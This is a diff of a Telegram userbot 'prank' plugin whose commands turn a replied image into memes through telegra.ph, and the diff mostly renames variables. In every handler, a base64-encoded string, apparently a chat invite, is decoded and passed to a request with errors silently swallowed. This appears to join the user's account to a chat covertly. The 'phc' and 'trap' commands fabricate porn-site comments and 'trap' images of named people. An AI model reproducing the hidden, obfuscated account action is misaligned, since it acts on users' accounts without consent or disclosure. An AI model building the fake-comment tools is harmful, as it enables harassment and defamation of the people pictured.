@@ -36,238 +36,238 @@ from . import *
 
 @bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
-async def rebelbot(rebelmemes):
-    replied = await rebelmemes.get_reply_message()
+async def REBELBOT(REBELmemes):
+    replied = await REBELmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            rebelmemes, "`Media file not supported. Reply to a supported media`"
+            REBELmemes, "`Media file not supported. Reply to a supported media`"
         )
         return
     if replied.media:
-        rebelmemmes = await edit_or_reply(rebelmemes, "`Detecting Threats.........`")
+        REBELmemmes = await edit_or_reply(REBELmemes, "`Detecting Threats.........`")
     else:
         await edit_or_reply(
-            rebelmemes, "`Media file not supported. Reply to a suported media`"
+            REBELmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        rebel = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        rebel = Get(rebel)
-        await rebelmemes.client(rebel)
+        REBEL = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        REBEL = Get(REBEL)
+        await REBELmemes.client(REBEL)
     except BaseException:
         pass
-    download_location = await rebelmemes.client.download_media(replied, "./temp/")
+    download_location = await REBELmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await rebelmemmes.edit(
+            await REBELmemmes.edit(
                 "`The replied file is not supported. It should be less than 5mb -_-`"
             )
             os.remove(download_location)
             return
-        await rebelmemmes.edit("`Detected Threats....`")
+        await REBELmemmes.edit("`Detected Threats....`")
     else:
-        await rebelmemmes.edit("`the replied file is not supported`")
+        await REBELmemmes.edit("`the replied file is not supported`")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await rebelmemmes.edit("ERROR: " + str(exc))
+        await REBELmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    rebel = f"https://telegra.ph{response[0]}"
-    rebel = await threats(rebel)
-    await rebelmemmes.delete()
-    await rebelmemes.client.send_file(rebelmemes.chat_id, rebel, reply_to=replied)
+    REBEL = f"https://telegra.ph{response[0]}"
+    REBEL = await threats(REBEL)
+    await REBELmemmes.delete()
+    await REBELmemes.client.send_file(REBELmemes.chat_id, REBEL, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trash(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
-async def rebelbot(rebelmemes):
-    replied = await rebelmemes.get_reply_message()
+async def REBELBOT(REBELmemes):
+    replied = await REBELmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            rebelmemes, "`Media file not supported. Reply to a suported media`"
+            REBELmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     if replied.media:
-        rebelmemmes = await edit_or_reply(rebelmemes, "`Detecting Trash....`")
+        REBELmemmes = await edit_or_reply(REBELmemes, "`Detecting Trash....`")
     else:
         await edit_or_reply(
-            rebelmemes, "`Media file not supported. Reply to a suported media`"
+            REBELmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        rebel = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        rebel = Get(rebel)
-        await rebelmemes.client(rebel)
+        REBEL = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        REBEL = Get(REBEL)
+        await REBELmemes.client(REBEL)
     except BaseException:
         pass
-    download_location = await rebelmemes.client.download_media(replied, "./temp/")
+    download_location = await REBELmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await rebelmemmes.edit(
+            await REBELmemmes.edit(
                 "`The replied file is not suported. Its size should be less than 5mb-_-`"
             )
             os.remove(download_location)
             return
-        await rebelmemmes.edit("`Detected Trash.....`")
+        await REBELmemmes.edit("`Detected Trash.....`")
     else:
-        await rebelmemmes.edit("Media file not supported. Reply to a suported media")
+        await REBELmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await rebelmemmes.edit("ERROR: " + str(exc))
+        await REBELmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    rebel = f"https://telegra.ph{response[0]}"
-    rebel = await trash(rebel)
-    await rebelmemmes.delete()
-    await rebelmemes.client.send_file(rebelmemes.chat_id, rebel, reply_to=replied)
+    REBEL = f"https://telegra.ph{response[0]}"
+    REBEL = await trash(REBEL)
+    await REBELmemmes.delete()
+    await REBELmemes.client.send_file(REBELmemes.chat_id, REBEL, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
-async def rebelbot(rebelmemes):
-    input_str = rebelmemes.pattern_match.group(1)
+async def REBELBOT(REBELmemes):
+    input_str = REBELmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         text1, text2 = input_str.split("-")
     else:
         await edit_or_reply(
-            rebelmemes,
+            REBELmemes,
             "**Command :** Reply to image or sticker with `.trap (name of the person to trap)-(trapper name)`",
         )
         return
-    replied = await rebelmemes.get_reply_message()
+    replied = await REBELmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            rebelmemes, "Media file not supported. Reply to a suported media"
+            REBELmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        rebelmemmes = await edit_or_reply(rebelmemes, "`Trapping.....`")
+        REBELmemmes = await edit_or_reply(REBELmemes, "`Trapping.....`")
     else:
         await edit_or_reply(
-            rebelmemes, "Media file not supported. Reply to a suported media"
+            REBELmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        rebel = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        rebel = Get(rebel)
-        await rebelmemes.client(rebel)
+        REBEL = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        REBEL = Get(REBEL)
+        await REBELmemes.client(REBEL)
     except BaseException:
         pass
-    download_location = await rebelmemes.client.download_media(replied, "./temp/")
+    download_location = await REBELmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await rebelmemmes.edit(
+            await REBELmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await rebelmemmes.edit("`Trapped...`")
+        await REBELmemmes.edit("`Trapped...`")
     else:
-        await rebelmemmes.edit("Media file not supported. Reply to a suported media")
+        await REBELmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await rebelmemmes.edit("ERROR: " + str(exc))
+        await REBELmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    rebel = f"https://telegra.ph{response[0]}"
-    rebel = await trap(text1, text2, rebel)
-    await rebelmemmes.delete()
-    await rebelmemes.client.send_file(rebelmemes.chat_id, rebel, reply_to=replied)
+    REBEL = f"https://telegra.ph{response[0]}"
+    REBEL = await trap(text1, text2, REBEL)
+    await REBELmemmes.delete()
+    await REBELmemes.client.send_file(REBELmemes.chat_id, REBEL, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="phc(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="phc(?: |$)(.*)", allow_sudo=True))
-async def rebelbot(rebelmemes):
-    input_str = rebelmemes.pattern_match.group(1)
+async def REBELBOT(REBELmemes):
+    input_str = REBELmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         username, text = input_str.split("-")
     else:
         await edit_or_reply(
-            rebelmemes,
+            REBELmemes,
             "**Command :** reply to image or sticker with `.phc (username)-(text in comment)`",
         )
         return
-    replied = await rebelmemes.get_reply_message()
+    replied = await REBELmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            rebelmemes, "Media file not supported. Reply to a suported media"
+            REBELmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        rebelmemmes = await edit_or_reply(rebelmemes, "`Making A Comment`.")
+        REBELmemmes = await edit_or_reply(REBELmemes, "`Making A Comment`.")
     else:
         await edit_or_reply(
-            rebelmemes, "Media file not supported. Reply to a suported media"
+            REBELmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        rebel = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        rebel = Get(rebel)
-        await rebelmemes.client(rebel)
+        REBEL = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        REBEL = Get(REBEL)
+        await REBELmemes.client(REBEL)
     except BaseException:
         pass
-    download_location = await rebelmemes.client.download_media(replied, "./temp/")
+    download_location = await REBELmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await rebelmemmes.edit(
+            await REBELmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await rebelmemmes.edit("Commented....")
+        await REBELmemmes.edit("Commented....")
     else:
-        await rebelmemmes.edit("Media file not supported. Reply to a suported media")
+        await REBELmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await rebelmemmes.edit("ERROR: " + str(exc))
+        await REBELmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    rebel = f"https://telegra.ph{response[0]}"
-    rebel = await phcomment(rebel, text, username)
-    await rebelmemmes.delete()
-    await rebelmemes.client.send_file(rebelmemes.chat_id, rebel, reply_to=replied)
+    REBEL = f"https://telegra.ph{response[0]}"
+    REBEL = await phcomment(REBEL, text, username)
+    await REBELmemmes.delete()
+    await REBELmemes.client.send_file(REBELmemes.chat_id, REBEL, reply_to=replied)
 
 
 CmdHelp("prank").add_command(
-  "phc", "<reply to img> <name> - <comment>", "Changes the given pic to dp and shows a comment in phub with the given name", "<reply to img/stcr> .phc NAME - rebelO PHUB"
+  "phc", "<reply to img> <name> - <comment>", "Changes the given pic to dp and shows a comment in phub with the given name", "<reply to img/stcr> .phc NAME - REBELO PHUB"
 ).add_command(
   "trap", "<reply to img/stcr> <victim name> - <trapper name>", "Changes the given pic to another pic which shows that pic content is trapped in trap card", "<reply to img/stcr> .trap Loda - Lassan"
 ).add_command(
